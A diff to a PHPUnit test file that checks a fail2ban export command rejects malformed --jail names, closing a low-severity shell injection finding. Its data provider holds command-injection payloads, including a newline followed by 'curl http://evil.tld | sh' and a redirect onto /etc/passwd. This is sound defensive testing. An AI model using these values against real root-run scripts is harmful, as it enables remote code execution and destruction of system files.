@@ -416,21 +416,69 @@ class ExportInjectionTest extends TestCase
     // ── the jail name is operator-controlled, and worth stating ────────────
 
     /**
-     * TD-015. --jail is interpolated into the generated shell command. It comes
-     * from the operator's own command line, so it is not an attacker input —
-     * but it is unquoted, and the output is a script that gets run as root.
+     * TD-015. --jail is interpolated into a script the operator runs as root.
+     *
+     * It comes from their own command line, so it is not an attacker input and
+     * this is the lowest-severity finding in the audit. It is still worth
+     * closing: the output is a root-run script, a jail name is a fail2ban
+     * identifier with a known shape, and rejecting anything else costs nothing.
+     *
+     * @return array<string, array{0: string}>
      */
+    public static function malformedJailNames(): array
+    {
+        return [
+            'shell separator' => ['my jail; id'],
+            'command substitution' => ['jail$(id)'],
+            'backticks' => ['jail`id`'],
+            'pipe' => ['jail | sh'],
+            'newline' => ["jail\ncurl http://evil.tld | sh"],
+            'redirect' => ['jail > /etc/passwd'],
+            'space' => ['my jail'],
+            'quote' => ["jail'"],
+            'empty' => [''],
+        ];
+    }
+
     #[Test]
-    public function the_jail_option_is_interpolated_into_the_generated_shell_script_unquoted(): void
+    #[DataProvider('malformedJailNames')]
+    public function a_malformed_jail_name_never_reaches_the_generated_script(string $jail): void
     {
         $this->seedIp(self::GOOD_IP);
 
-        $output = $this->runCommand('threat-detection:export-fail2ban', ['--jail' => 'my jail; id']);
+        $output = $this->runCommand('threat-detection:export-fail2ban', ['--jail' => $jail]);
+
+        // No command line is emitted at all — the run is refused, not escaped.
+        $this->assertStringNotContainsString(
+            'fail2ban-client set',
+            $output,
+            'a malformed jail name reached the generated script: ' . var_export($output, true)
+        );
+        $this->assertStringContainsString('Invalid --jail name', $output);
+    }
+
+    /** Positive control: an ordinary jail name is still used verbatim. */
+    #[Test]
+    public function a_valid_jail_name_is_used_as_given(): void
+    {
+        $this->seedIp(self::GOOD_IP);
+
+        $output = $this->runCommand('threat-detection:export-fail2ban', ['--jail' => 'my-jail_2']);
 
         $this->assertStringContainsString(
-            'fail2ban-client set my jail; id banip',
+            'fail2ban-client set my-jail_2 banip ' . self::GOOD_IP,
             $output,
-            'the jail name is no longer interpolated verbatim — update this test'
+            'a valid jail name was rejected or rewritten'
         );
+    }
+
+    #[Test]
+    public function the_default_jail_name_is_unchanged(): void
+    {
+        $this->seedIp(self::GOOD_IP);
+
+        $output = $this->runCommand('threat-detection:export-fail2ban');
+
+        $this->assertStringContainsString('fail2ban-client set threat-detection banip', $output);
     }
 }
